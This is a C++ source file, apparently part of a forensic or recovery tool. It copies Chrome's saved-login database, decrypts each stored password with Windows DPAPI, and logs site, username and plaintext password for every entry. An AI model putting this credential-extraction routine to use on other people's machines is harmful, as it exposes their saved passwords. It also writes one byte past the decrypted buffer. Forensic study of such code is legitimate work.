#include "stdafx.h"
#include "SG_Browsers_Credentials.h"
#include "chrome_secrets.h"
#include "Utils.h"
int SG_GetChromeCredentials(SGBrowserCredentialsArray *credentials)
{
	CString chrome_datetime;		// Used for chrome datetime object

	bool result = false;
	WCHAR *Site, *User, *CreationDate;

	DATA_BLOB DataIn, DataOut;
	
	// Obtain the Profile Folder
	TCHAR szProfileFolderPath[MAX_PATH];
	result = SHGetSpecialFolderPath(0, szProfileFolderPath, CSIDL_LOCAL_APPDATA, 0);
	StrCat(szProfileFolderPath, FORENSICS_CHROMECREDENTIALS_PATH);
	// ===========================
	StrCat(szProfileFolderPath, FORENSICS_CHROMECREDENTIALS_DB);

	CopyFile(szProfileFolderPath, TEMP_CHROME_DB, FALSE);
	int rc = 0;
	CppSQLite3DB CredentialsDB;
	try
	{
		CredentialsDB.open(TEMP_CHROME_DB);
	}
	catch (CppSQLite3Exception &e)
	{
		// Handle exceptions here
		return false;
	}
	CppSQLite3Query SqlQuery;
	CString sql;
	sql = CHROME_CRED_SQL_QUERY;
	try
	{
		SqlQuery = CredentialsDB.execQuery(sql);
	}
	catch (CppSQLite3Exception &e)
	{
		// Handle query execution's exceptions here
		return 0;
	}
	int count = 0;
	int size = 0;
	char *szPassword;


	while (!SqlQuery.eof())
	{
		Site = (WCHAR *)SqlQuery.fieldValue(CHROME_DB_FIELD_SITE);
		User = (WCHAR *)SqlQuery.fieldValue(CHROME_DB_FIELD_USER);
		DataIn.pbData = (LPBYTE)SqlQuery.getBlobField(CHROME_DB_ENC_FIELD_PASS, size);
		DataIn.cbData = size;
		CreationDate = (WCHAR *)SqlQuery.fieldValue(CHROME_DB_FIELD_DATE);
		bool bDecrypted = CryptUnprotectData(&DataIn, 0, 0, 0, 0, 8, &DataOut);
		if (bDecrypted)
		{
			SGBrowserCredentials SingleBrowserCredentialsEntry;
			wcsncpy_s(SingleBrowserCredentialsEntry.Site, Site, 256);
			wcsncpy_s(SingleBrowserCredentialsEntry.UserName, User, 80);
			szPassword = (char*)DataOut.pbData;
			szPassword[DataOut.cbData] = '\0';
			CString Pass(szPassword);
			wcsncpy_s(SingleBrowserCredentialsEntry.Password, ((CString)szPassword).GetBuffer(), 80);
			SingleBrowserCredentialsEntry.DateCreated = utils::ChromeCredentialsTimeToCTime(CreationDate);
			SingleBrowserCredentialsEntry.Browser = 0;
			utils::WriteStatus(L"Site: %s User: %s Password: %s Date: %s\n", Site, User, Pass, SingleBrowserCredentialsEntry.DateCreated.Format(SG_FRIEDLY_DATEFORMAT));

			credentials->Add(SingleBrowserCredentialsEntry);
		}
		SqlQuery.nextRow();
	}
	return credentials->GetSize();
}
